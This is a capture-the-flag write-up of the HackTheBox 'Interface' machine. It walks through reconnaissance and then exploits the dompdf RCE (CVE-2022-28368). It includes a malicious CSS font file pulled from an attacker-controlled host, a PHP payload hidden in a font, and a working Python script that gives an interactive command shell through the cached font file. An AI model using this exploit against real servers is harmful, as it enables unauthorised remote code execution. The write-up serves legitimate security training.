HackTheBox -Interface

Initial Nmap tcp port scan
```bash
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
```
# Target OS
Based upon openssh version target is running ubuntu bionic 18.04

# interface.htb

found this from main.js file and the parameter value are i fuzzed 
http://interface.htb/_next/image?url=/etc/passwd&w=16&q=1

# prd.m.rendering-api.interface.htb

http://prd.m.rendering-api.interface.htb/vendor/dompdf
http://prd.m.rendering-api.interface.htb/vendor/composer

# Content discovery
http://prd.m.rendering-api.interface.htb/vendor                                          
http://prd.m.rendering-api.interface.htb/vendor/dompdf                                                             
http://prd.m.rendering-api.interface.htb/vendor/dompdf                                                             
http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf                                                      
http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf                                                      
http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib                                                  
http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/tests                                                
http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/tests                                                
http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src                                                  
http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src                                                  
http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/VERSION                                              
http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/VERSION                                              
http://prd.m.rendering-api.interface.htb/vendor/composer                                                           
http://prd.m.rendering-api.interface.htb/vendor/composer                                                           
http://prd.m.rendering-api.interface.htb/vendor/composer/LICENSE                                                   
http://prd.m.rendering-api.interface.htb/vendor/composer/LICENSE   


***Shell as www-data**

Fuzzing the api endpoint with fuff and post method we can find a endpoint {/api/html2pdf} that is used to convert html to pdf.
We already know from our content discovery the backend is use dompdf which is an php library to convert html to pdf. [https://github.com/dompdf/dompdf](https://github.com/dompdf/dompdf). Once we test the endpoint with some html payload it covert back to us as pdf and we can download the file. Examine the pdf file with exiftool it reveal the versin of dompdf 'dompdf 1.2.0 + CPDF'. Check the public exploit of this version we found this 
>In March 2022, security researchers from Positive Security identified a remote code execution (RCE) vulnerability in Dompdf. It was identified that Dompdf version <=1.2.0 is prone to remote code execution, which is mapped to CVE-2022-28368

**Exploiting Dompdf**
Dompdf version <= 1.2.0 is prone to remote code execution (RCE) when the "$isRemoteEnabled" configuration parameter is set to "true" and on version <= 0.8.5, it is prone to RCE irrespective of this configuration. Parameter "$isRemoteEnabled" allows Dompdf to access remote sites for images and CSS files as required. This feature is exploited to inject malicious CSS files into Dompdf and trick it to execute the malicious PHP payload.

Detailed blog [https://www.optiv.com/insights/source-zero/blog/exploiting-rce-vulnerability-dompdf#:~:text=In%20March%202022%2C%20security%20researchers,to%20CVE%2D2022%2D28368.](https://www.optiv.com/insights/source-zero/blog/exploiting-rce-vulnerability-dompdf#:~:text=In%20March%202022%2C%20security%20researchers,to%20CVE%2D2022%2D28368.)

**Method to exploit**

First, we need to create a css file with a custom font and the url of the font, which is mapped to us, to fetch our malicious php file. After that, create a font file and append our PHP payload to the end of it. setup a python http listener and add this payload to "head> link rel="stylesheet" href="http://10.10.16.16/font.css">/head>body>Injected-Font by-elf1337/body>" for converting the html to pdf. Once we request the conversion, we need to hit the cache to cache our font on the server. After that, we can get our malicious font file from "/vendor/dompdf/dompdf/lib/fonts/our-font_name." NOTE: The font name is created using our font name and the hash of the url that was used to fetch our font file from the CSS file. Now we can achieve the RCE.
This exploit has multiple steps we need to run manually, so I decided to create a Python script to automate all of them. Here are the scripts.

```css
#font.css
@font-face {
    font-family: 'xfont';
    src: url('http://10.10.16.16/xfont.php');
    font-weight:'normal';
    font-style:'normal';
}
```

```bash
# interface.py
import requests
import hashlib

BASEURL = 'http://prd.m.rendering-api.interface.htb'
DATA = {"html":"<head><link rel=\"stylesheet\" href=\"http://10.10.16.16/font.css\"></head><body>Injected-Font by-elf1337</body>"}


# PDF request
def request():
    res = requests.post(f'{BASEURL}/api/html2pdf',json=DATA)
    return res.headers['X-Local-Cache']

def get(cmd):
    hash = hashlib.md5('http://10.10.16.16/xfont.php'.encode()).hexdigest()
    fontName = f'xfont_normal_{hash}.php'
    params = {"cmd":cmd}
    res = requests.get(url=f'{BASEURL}/vendor/dompdf/dompdf/lib/fonts/{fontName}',params=params)
    print(res.text)

print("[+] Starting PDF request")
for i in range(1,5):    
    if 'hit' in request():
        break
print("[+] Cache hited")
while True:
    cmd = input('prompt> ')
    get(cmd)
```
